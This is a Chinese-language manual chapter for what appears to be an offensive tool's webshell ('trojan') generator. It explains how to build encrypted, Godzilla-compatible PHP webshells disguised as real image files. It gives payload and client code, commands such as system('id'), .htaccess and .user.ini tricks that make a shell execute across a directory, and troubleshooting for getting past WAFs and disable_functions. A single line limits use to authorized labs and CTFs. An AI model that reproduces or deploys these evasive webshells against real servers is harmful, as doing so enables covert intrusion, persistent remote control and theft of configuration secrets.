# 22 木马生成器 v2：加密载荷 + 图片马（哥斯拉级）

**入口**：左侧菜单「攻击」→「木马生成」→ `/attack/trojan` → 顶部 **🛡 免杀生成器**

第 [19 章](19-trojan-evasion.md) 讲的是「三档混淆 + 图片头伪装」，解决的是**静态查杀**。
本章是 v2.0 重写版，解决**流量特征**：官方模板和 19 章的一代产物，请求体都是 `pass=eval 代码` 的明文 Base64，流量侧一眼可见；v2 引入**密钥协商的加密信道**，并补齐文件管理、数据库、信息收集等实战功能。

---

## 1. v2 相比 v1 增加了什么

| 能力 | v1（19 章） | v2（本章） |
|---|---|---|
| 载荷加密 | 无（仅混淆变量名） | **XOR+Base64 / AES-128-CBC / 纯 Base64 / 明文** 四种 |
| 通信协议 | `pass=base64(php)` | 加密信道 + **md5 标记包裹**响应 |
| 图片马 | 拼接真实图片头 | 同左，但图标由 **canvas 实时绘制**（盾牌），非 1×1 占位点 |
| 图标格式 | PNG/ICO 为主 | **GIF / PNG / JPG / BMP / ICO(256)** 五种，全部真实可解码 |
| 功能模式 | eval / cmd / 文件读写 | 增加 **file（完整文件管理器）/ db（mysqli）/ info（信息收集）** |
| 连接工具 | 手动构造请求 | **一键生成 `connect.py`**（含标记定位、自动禁代理） |
| 自检 | 无 | **一键生成 `selftest.php`**，验证加密往返是否通 |
| 哥斯拉兼容 | 无 | **XOR 模式与哥斯拉 `PHP_XOR_BASE64` 同构**，可直接用哥斯拉连 |

> ⚠️ 仅可用于授权靶场 / CTF / AWD。把木马写到未授权系统属于违法犯罪。

---

## 2. 面板控件说明

| 控件 | 取值 | 说明 |
|---|---|---|
| 语言 | PHP / JSP / ASPX | 加密信道仅 PHP 支持；JSP/ASPX 保持 v1 混淆 |
| 功能 | 命令执行 / 文件管理 / 数据库 / 信息收集 / 自定义 | 决定 `phpBody` 分支 |
| 免杀等级 | L1 / L2 / L3 | 变量名混淆强度，与加密正交（可叠加） |
| 加密 | XOR+Base64 / AES-128-CBC / Base64 / 明文 | 见第 3 节 |
| 密钥 | 16 位 | 点「随机」生成；**必须与连接脚本一致** |
| 伪装 | 不伪装 / GIF / PNG / JPG / ICO / BMP / 自定义 | 决定图片头和默认文件名 |
| 文件名 | 文本 | 切换伪装时自动改名（`favicon.php` / `avatar.php` / `logo.php` …） |

右侧实时显示：
- **字节预览**：文件前 256 字节的十六进制，可肉眼确认图片头
- **图片头识别**：`PNG ✓` / `GIF ✓` / `ICO ✓` / `无图片头`
- **图标缩略图**：真实渲染的盾牌图标（128×128）
- **连接参数**：URL、密码、密钥、加密方式、哥斯拉连接指引

---

## 3. 四种加密模式

### 3.1 XOR+Base64（推荐，哥斯拉兼容）

与哥斯拉 `PHP_XOR_BASE64` **同构**，可以直接用哥斯拉客户端连接：

```
请求体：pass = base64( xor(php代码, key) )
解密函数：$D[$i] ^ $K[($i+1) & 15]
```

- `key` 必须是 **16 字节**
- 响应：`md5(pass+key)[0:16]` + `base64(xor(输出,key))` + `md5(pass+key)[16:32]`
- 用 `$_SESSION['payload']` 缓存已解密代码，第二次请求不再传 payload

**哥斯拉连接方式**：新建 PHP_XOR_BASE64 载荷 → 密码填面板里的「参数」→ 密钥填面板里的「密钥」→ 连接。

### 3.2 AES-128-CBC+Base64

```php
$iv  = substr(md5($key), 0, 16);
$enc = openssl_encrypt($code, 'AES-128-CBC', $key, OPENSSL_RAW_DATA, $iv);
```

- 依赖 `openssl` 扩展；被禁用时自动降级为 XOR
- 响应同样是 md5 标记包裹
- **哥斯拉连不上**，请用本工具生成的 `connect.py`

### 3.3 纯 Base64

只编码不加密，用于目标禁用 `openssl` 且不方便用 XOR 的场景。响应用 `md5(pass)` 做标记。

### 3.4 明文

调试用。等价于传统一句话。

---

## 4. 响应标记机制（图片马的关键）

图片马的第一个字节是图片，不是 `<?php`。PHP 执行时，**`<?php` 之前的图片字节已经被输出**，于是响应变成：

```
[图片二进制 14540 字节][加密载荷][更多图片残留]
```

客户端直接 `base64_decode` 必然失败。v2 用两层机制解决：

1. **清缓冲**：载荷开头执行
   ```php
   while (ob_get_level() > 0) { if (!@ob_end_clean()) break; }
   ```
   `output_buffering` 开启时（PHP 默认 4096），图片字节还在缓冲区里，会被直接丢弃。
   图片 > 4KB 时缓冲区已自动刷出，此时靠第 2 层。

2. **md5 标记定位**：
   ```
   响应 = ...图片字节... + md5(pass+key)[0:16] + base64载荷 + md5(pass+key)[16:32]
   ```
   客户端在两个标记之间截取，与前后噪音无关。

实测：14.5 KB 的 PNG 图片马、400 字节的 GIF 图片马，在 `php -S`（输出缓冲 4096）下都能正确取回明文。

---

## 5. 生成的连接脚本 `connect.py`

面板底部「连接脚本 .py」会下载一个自包含脚本：

```python
URL  = "http://TARGET/favicon.php"   # 改成目标地址
PASS = "pass"
KEY  = "0123456789abcdef"

MARK = hashlib.md5((PASS + KEY).encode()).hexdigest()

def unwrap(raw):
    i = raw.find(MARK[:16])
    if i >= 0:
        j = raw.find(MARK[16:], i + 16)
        if j > i:
            return raw[i + 16:j]
    return raw.strip()
```

用法：

```bash
python3 connect.py 'echo php_uname();'
python3 connect.py 'system("id");'
python3 connect.py 'print_r(scandir("/var/www"));'
```

**两个已踩过的坑（脚本里已处理）：**

| 坑 | 现象 | 处理 |
|---|---|---|
| 系统代理 | 本机/内网目标被 Clash、Surge 之类代理拦成 `502 Bad Gateway` 或 `RemoteDisconnected` | `build_opener(ProxyHandler({}))` 显式禁用代理 |
| 图片头污染 | `UnicodeEncodeError: 'ascii' codec can't encode ...` | 用 md5 标记截取，不用 `raw[16:-16]` 硬截 |

---

## 6. 自检脚本 `selftest.php`

面板底部「自检脚本 .php」生成的脚本**不联网**，直接在目标上验证：

- PHP 版本、`openssl` / `mysqli` / `gd` / `zip` 是否可用
- `disable_functions` 里禁了哪些
- 当前用户、`open_basedir`
- 加密/解密往返是否成功（自测 key 与算法）

上传后浏览器直接访问 `http://target/selftest.php` 即可看到结果。

---

## 7. 图片马配套文件

图片马改名成 `.php` 后，`getimagesize()` 会判成图片，但**有些 WAF 会拒绝 `Content-Type: image/png` 的 PHP 文件**，或者目标目录不允许执行 PHP。配套：

### 7.1 `.htaccess`（Apache）

```apache
AddType application/x-httpd-php .php .jpg .png .gif .ico
```

让 `.jpg` 也被当 PHP 解析。

### 7.2 `.user.ini`（PHP-FPM / CGI，Apache 的 mod_php 不支持）

```ini
auto_prepend_file = "favicon.php"
```

访问目录下**任意** `.php` 都会先执行 `favicon.php`，等于把木马挂到整个目录。

> 这两个文件面板都能一键生成。上传后 `.user.ini` 需要等 `user_ini.cache_ttl`（默认 300 秒）生效。

---

## 8. 常见问题

**Q1：生成的文件用 `file` 命令看是什么？**
A：伪装模式下是 `PNG image data, 128 x 128, 8-bit/color RGBA, non-interlaced` 之类，不是 `PHP script`。`php -l` 仍能通过语法检查（PHP 允许 `<?php` 前有任意输出）。

**Q2：连接返回空 / 502 / RemoteDisconnected？**
A：按顺序排查：①系统代理（用 `curl --noproxy '*'` 对比）②密钥是否与木马里的一致 ③`openssl` 是否被禁（AES 模式）④`session.save_path` 是否可写（XOR 模式用了 `$_SESSION`）。

**Q3：AES 模式哥斯拉连不上？**
A：正常。哥斯拉没有 `AES-128-CBC + md5(key)[0:16] 做 IV` 这种组合。用本工具的 `connect.py`，或改用 XOR 模式。

**Q4：图片马传上去 404 / 直接下载？**
A：目标不允许该扩展名执行。改用 `.php` 扩展名 + 图片头（文件名伪装，不靠扩展名），或上传 `.htaccess` / `.user.ini`。

**Q5：为什么图标看起来都一样？**
A：五种格式画的都是同一个盾牌图案，只是**编码格式和尺寸**不同（GIF 64、PNG/JPG 128、BMP 64、ICO 256）。缩略图是预览，不随格式变。要看真实字节请用「字节预览」区。

**Q6：`disable_functions` 禁了 `system` 怎么办？**
A：用「文件管理」模式读 `config.php`、`.env`，或用「信息收集」看 `phpinfo`。命令执行被禁时文件操作通常还能用。

---

## 9. 与官方模板的差异

官方 `/attack/trojan` 页只有 4 类型 × 3 语言共 12 个**固定模板**，代码里是：

```php
<?php eval($_POST['pass']); ?>
```

本扩展的产物：

- 变量名全随机（L2/L3）
- 无 `eval` / `assert` 关键字（L3 用 `call_user_func` 或拼接字符串）
- 请求体加密，流量侧看不到 PHP 代码
- 文件头是真实图片

但**静态查杀只是第一层**。真正决定能不能过的是：目标有没有 `disable_functions`、目录能不能写、WAF 规则严不严。生成器只负责产物，落地要看第 6 节的自检结果。
